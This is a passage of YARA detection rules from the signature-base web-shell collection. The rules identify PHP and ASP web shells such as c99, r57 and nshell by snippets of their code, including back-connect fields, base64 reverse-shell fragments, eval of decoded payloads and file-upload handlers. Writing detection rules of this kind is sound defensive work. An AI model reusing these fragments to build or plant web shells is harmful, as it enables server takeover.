		logic_hash = "0d32fc00ba2602a1140dc9030894bb9524c55b95c445a08f2bf6f8fc60108e64"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "9c5bb5e3a46ec28039e8986324e42792"
		hash1 = "44542e5c3e9790815c49d5f9beffbbf2"
		hash2 = "09609851caa129e40b0d56e90dfc476c"
		hash3 = "38fd7e45f9c11a37463c3ded1c76af4c"

	strings:
		$s0 = "if(eregi(\"./shbd $por\",$scan))"
		$s1 = "$_POST['backconnectip']"
		$s2 = "$_POST['backcconnmsg']"

	condition:
		1 of them
}
rule SIGNATURE_BASE__R577_Php_Php_R57_Php_Php_R57_Shell_Php_Php_Spy_Php_Php_S_Php_Php {
    meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, r57.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "093892f6-ff53-5bd1-b7b2-fea21a9258aa"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5206-L5223"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "afbd2103b0c953d6aec070ba450f43e567560bc9743423a5731cd4d6e5e36bb6"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash2 = "8023394542cddf8aee5dec6072ed02b5"
		hash3 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash4 = "817671e1bdc85e04cc3440bbd9288800"

	strings:
		$s1 = "if(rmdir($_POST['mk_name']))"
		$s2 = "$r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.$key.'</b></font></td>"
		$s3 = "if(unlink($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cell"

	condition:
		2 of them
}
rule SIGNATURE_BASE__W_Php_Php_Wacking_Php_Php_Sses_Php_Php_Specialshell_99_Php_Php {
    meta:
		description = "Semi-Auto-generated  - from files w.php.php.txt, wacking.php.php.txt, SsEs.php.php.txt, SpecialShell_99.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "81480945-b684-50b6-9431-4ab7a786b214"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5224-L5240"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "9bbcb687c83c01ad52e8978a60e604a74f10c33a63af3b91d0286b30dea42890"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "9c5bb5e3a46ec28039e8986324e42792"
		hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
		hash3 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = "\"ext_avi\"=>array(\"ext_avi\",\"ext_mov\",\"ext_mvi"
		$s1 = "echo \"<b>Execute file:</b><form action=\\\"\".$surl.\"\\\" method=POST><inpu"
		$s2 = "\"ext_htaccess\"=>array(\"ext_htaccess\",\"ext_htpasswd"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Multiple_Php_Webshells {
    meta:
		description = "Semi-Auto-generated  - from files multiple_php_webshells"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5242-L5263"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "d55c96febd64107273001edadbda6d0a1b4b00e35fb41b46561b49fca6a9bd1b"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "911195a9b7c010f61b66439d9048f400"
		hash2 = "be0f67f3e995517d18859ed57b4b4389"
		hash3 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash4 = "8023394542cddf8aee5dec6072ed02b5"
		hash5 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash6 = "817671e1bdc85e04cc3440bbd9288800"
		hash7 = "7101fe72421402029e2629f3aaed6de7"
		hash8 = "f618f41f7ebeb5e5076986a66593afd1"

	strings:
		$s0 = "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI"
		$s2 = "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0"
		$s4 = "A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg"

	condition:
		2 of them
}
rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php {
    meta:
		description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ee1fd555-f1bc-59a5-998c-f6098de8623e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5264-L5279"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "c089f8175532ddc0e2d256b4972f7db32683bd213a456622ed27ab4844d1e435"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"

	strings:
		$s0 = "<b>Dumped! Dump has been writed to "
		$s1 = "if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo \"<TABLE st"
		$s2 = "<input type=submit name=actarcbuff value=\\\"Pack buffer to archive"

	condition:
		1 of them
}
rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php_C99Shell_V1_0_Php_Php_C99Php {
    meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5280-L5297"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "e82882e89a1aeb256768f2af7a6d3674c89f9abc358710b33b8d3d425defcef1"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"

	strings:
		$s0 = "@ini_set(\"highlight" fullword
		$s1 = "echo \"<b>Result of execution this PHP-code</b>:<br>\";" fullword
		$s2 = "{$row[] = \"<b>Owner/Group</b>\";}" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE__GFS_Web_Shell_Ver_3_1_7___Priv8_Php_Nshell_Php_Php_Gfs_Sh_Php_Php {
    meta:
		description = "Semi-Auto-generated  - from files GFS web-shell ver 3.1.7 - PRiV8.php.txt, nshell.php.php.txt, gfs_sh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "4d1dd87b-1ffd-564d-9411-c5d2fc01ae0f"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5298-L5313"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "9df5b6df25574b303044a0799c5eb5f38f9ebfbc6f6114275fe1e34adbde1f7c"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "be0f67f3e995517d18859ed57b4b4389"
		hash1 = "4a44d82da21438e32d4f514ab35c26b6"
		hash2 = "f618f41f7ebeb5e5076986a66593afd1"

	strings:
		$s2 = "echo $uname.\"</font><br><b>\";" fullword
		$s3 = "while(!feof($f)) { $res.=fread($f,1024); }" fullword
		$s4 = "echo \"user=\".@get_current_user().\" uid=\".@getmyuid().\" gid=\".@getmygid()"

	condition:
		2 of them
}
rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php_C99Shell_V1_0_Php_Php_Specialshell_99_Php_Php {
    meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5314-L5332"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "0f44dc1ff243b234a718e8dbd5cc8c4dc8eb9d3b63300a5c6ff72b86280607bf"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash4 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = "c99ftpbrutecheck"
		$s1 = "$ftpquick_t = round(getmicrotime()-$ftpquick_st,4);" fullword
		$s2 = "$fqb_lenght = $nixpwdperpage;" fullword
		$s3 = "$sock = @ftp_connect($host,$port,$timeout);" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE__W_Php_Php_Wacking_Php_Php_C99Shell_V1_0_Php_Php_C99Php_Specialshell_99_Php_Php {
    meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5333-L5349"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "e9cd7425b806f71d8889f5df7f3fc2f4a692279fc4e495104646cfe28c5b5fe5"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "9c5bb5e3a46ec28039e8986324e42792"
		hash2 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash3 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash4 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = "$sqlquicklaunch[] = array(\""
		$s1 = "else {echo \"<center><b>File does not exists (\".htmlspecialchars($d.$f).\")!<"

	condition:
		all of them
}
rule SIGNATURE_BASE__Antichat_Php_Php_Fatalshell_Php_Php_A_Gedit_Php_Php {
    meta:
		description = "Semi-Auto-generated  - from files antichat.php.php.txt, Fatalshell.php.php.txt, a_gedit.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "6bf5640f-0773-5d93-8d27-0844062017c7"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5350-L5366"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "789340845aeed4accaef02afa1a1fe420e73b6f5af1b621f4ec2342994045278"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "128e90b5e2df97e21e96d8e268cde7e3"
		hash1 = "b15583f4eaad10a25ef53ab451a4a26d"
		hash2 = "ab9c6b24ca15f4a1b7086cad78ff0f78"

	strings:
		$s0 = "if(@$_POST['save'])writef($file,$_POST['data']);" fullword
		$s1 = "if($action==\"phpeval\"){" fullword
		$s2 = "$uploadfile = $dirupload.\"/\".$_POST['filename'];" fullword
		$s3 = "$dir=getcwd().\"/\";" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE__C99Shell_V1_0_Php_Php_C99Php_Sses_Php_Php {
    meta:
		description = "Semi-Auto-generated  - from files c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5367-L5380"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "b2bdf4187ff3d63e4af5c70e8cc93cd8fac3257b33c38764ad2bb2e206066162"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"

	strings:
		$s3 = "if (!empty($delerr)) {echo \"<b>Deleting with errors:</b><br>\".$delerr;}" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE__Crystal_Php_Nshell_Php_Php_Load_Shell_Php_Php {
    meta:
		description = "Semi-Auto-generated  - from files Crystal.php.txt, nshell.php.php.txt, load_shell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "a92134cd-7f10-589f-bcda-508bc7a20efe"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5381-L5396"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "71a9310b19b66e3699f75f551cc604f535ea843eb9c50f4a009edcd9c11e01b9"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "fdbf54d5bf3264eb1c4bff1fac548879"
		hash1 = "4a44d82da21438e32d4f514ab35c26b6"
		hash2 = "0c5d227f4aa76785e4760cdcff78a661"

	strings:
		$s0 = "if ($filename != \".\" and $filename != \"..\"){" fullword
		$s1 = "$dires = $dires . $directory;" fullword
		$s4 = "$arr = array_merge($arr, glob(\"*\"));" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE__Nst_Php_Php_Cybershell_Php_Php_Img_Php_Php_Nstview_Php_Php {
    meta:
		description = "Semi-Auto-generated  - from files nst.php.php.txt, cybershell.php.php.txt, img.php.php.txt, nstview.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "cc4dc0e9-dbb1-560b-ae36-23d3e16a407f"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5397-L5413"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "afc0b1c83644aa323d308471e5978b6b03f444f5f46fbaddac28ff42d524df1e"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "ddaf9f1986d17284de83a17fe5f9fd94"
		hash1 = "ef8828e0bc0641a655de3932199c0527"
		hash2 = "17a07bb84e137b8aa60f87cd6bfab748"
		hash3 = "4745d510fed4378e4b1730f56f25e569"

	strings:
		$s0 = "@$rto=$_POST['rto'];" fullword
		$s2 = "SCROLLBAR-TRACK-COLOR: #91AAFF" fullword
		$s3 = "$to1=str_replace(\"//\",\"/\",$to1);" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php_Dc3_Security_Crew_Shell_Priv_Php_Specialshell_99_Php_Php {
    meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "d22c4cc3-842b-5a24-bf4b-a8024b447b9e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5414-L5430"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "7a4c74912caa1855efc3a2ea7fa6d0082f62776d77a211e59f12892d4883f240"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "433706fdc539238803fd47c4394b5109"
		hash4 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = " if ($mode & 0x200) {$world[\"execute\"] = ($world[\"execute\"] == \"x\")?\"t\":"
		$s1 = " $group[\"execute\"] = ($mode & 00010)?\"x\":\"-\";" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE__C99Shell_V1_0_Php_Php_C99Php_1_C2007_Php_Php_C100_Php {
    meta:
		description = "Semi-Auto-generated  - from files c99shell_v1.0.php.php.txt, c99php.txt, 1.txt, c2007.php.php.txt, c100.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5431-L5446"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "a5dc73a12d8c8b89bab77b90cb3b561e9daf9db5f5ad550326a2fbce52c1c8da"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash2 = "44542e5c3e9790815c49d5f9beffbbf2"
		hash3 = "d089e7168373a0634e1ac18c0ee00085"
		hash4 = "38fd7e45f9c11a37463c3ded1c76af4c"

	strings:
		$s0 = "$result = mysql_query(\"SHOW PROCESSLIST\", $sql_sock); " fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Multiple_Php_Webshells_2 {
    meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5447-L5467"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "26fe586ba7f4d1931b2df81aa27543ff422e699fd56b6b1be289a0f8d6954691"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash5 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
		hash6 = "09609851caa129e40b0d56e90dfc476c"
		hash7 = "671cad517edd254352fe7e0c7c981c39"

	strings:
		$s0 = "elseif (!empty($ft)) {echo \"<center><b>Manually selected type is incorrect. I"
		$s1 = "else {echo \"<center><b>Unknown extension (\".$ext.\"), please, select type ma"
		$s3 = "$s = \"!^(\".implode(\"|\",$tmp).\")$!i\";" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php_1_Specialshell_99_Php_Php {
    meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "4915146e-141c-5515-ac5a-61901d42dc40"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5468-L5486"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "160adf93d4f9e51022c427b2b0601207dd9ca917e98d99e2013fe83e09a85d21"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "44542e5c3e9790815c49d5f9beffbbf2"
		hash4 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = "if ($total === FALSE) {$total = 0;}" fullword
		$s1 = "$free_percent = round(100/($total/$free),2);" fullword
		$s2 = "if (!$bool) {$bool = is_dir($letter.\":\\\\\");}" fullword
		$s3 = "$bool = $isdiskette = in_array($letter,$safemode_diskettes);" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE__R577_Php_Php_R57_Php_Php_Spy_Php_Php_S_Php_Php {
    meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, r57.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "022d2255-50cd-500b-8d91-8e34f3c46fcf"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5487-L5503"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "7ba3d6927dc06bfcd98ee9d7146164ca9a9024ef26eac60fabc8ed1375db618d"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash2 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash3 = "817671e1bdc85e04cc3440bbd9288800"

	strings:
		$s0 = "$res = mssql_query(\"select * from r57_temp_table\",$db);" fullword
		$s2 = "'eng_text30'=>'Cat file'," fullword
		$s3 = "@mssql_query(\"drop table r57_temp_table\",$db);" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE__Nixrem_Php_Php_C99Shell_V1_0_Php_Php_C99Php_NIX_REMOTE_WEB_SHELL_V_0_5_Alpha_Lite_Public_Version_Php {
    meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5504-L5521"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "f7575db2c8f147d03d5b93b431d1a73c4182b5db6e801e672914778b2042a712"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "40a3e86a63d3d7f063a86aab5b5f92c6"
		hash1 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash2 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash3 = "f3ca29b7999643507081caab926e2e74"

	strings:
		$s0 = "$num = $nixpasswd + $nixpwdperpage;" fullword
		$s1 = "$ret = posix_kill($pid,$sig);" fullword
		$s2 = "if ($uid) {echo join(\":\",$uid).\"<br>\";}" fullword
		$s3 = "$i = $nixpasswd;" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Darksecurityteam_Webshell {
    meta:
		description = "Dark Security Team Webshell"
		author = "Florian Roth (Nextron Systems)"
		id = "78dcd62f-9215-5571-a5ef-5f811ce9672f"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5525-L5537"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "f1c95b13a71ca3629a0bb79601fcacf57cdfcf768806a71b26f2448f8c1d5d24"
		logic_hash = "0c58ed8845cb04d785322b280647d424e1028a3be7e92b2493fd907fae36b16d"
		score = 50
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\"&HtmlEncode(Server.MapPath(\".\"))&" ascii

	condition:
		1 of them
}
rule SIGNATURE_BASE_PHP_Cloaked_Webshell_Superfetchexec {
    meta:
		description = "Looks like a webshell cloaked as GIF - http://goo.gl/xFvioC"
		author = "Florian Roth (Nextron Systems)"
		id = "4611129a-9865-5603-b1ec-7db0058a80d7"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "http://goo.gl/xFvioC"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5539-L5551"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "320b85b1ad39a90578f53c69838b6264af1e6a71c509aefc0986c7f0c77fdae9"
		score = 50
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "else{$d.=@chr(($h[$e[$o]]<<4)+($h[$e[++$o]]));}}eval($d);"

	condition:
		$s0
}
rule SIGNATURE_BASE_Webshell_Remexp_Asp_Php {
    meta:
		description = "PHP Webshells Github Archive - file RemExp.asp.php.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "274c8816-2711-5f12-937e-549ec2d57ce1"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5555-L5570"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d9919dcf94a70d5180650de8b81669fa1c10c5a2"
		logic_hash = "b3cfa44898629ffa20630436ae10a94ad72f0e793d61e1157a4de649aa048fe2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "lsExt = Right(FileName, Len(FileName) - liCount)" fullword
		$s7 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f"
		$s13 = "Response.Write Drive.ShareName & \" [share]\"" fullword
		$s19 = "If Request.QueryString(\"CopyFile\") <> \"\" Then" fullword
		$s20 = "<td width=\"40%\" height=\"20\" bgcolor=\"silver\">  Name</td>" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Dc3_Security_Crew_Shell_Priv {
    meta:
		description = "PHP Webshells Github Archive - file dC3_Security_Crew_Shell_PRiV.php"
		author = "Florian Roth (Nextron Systems)"
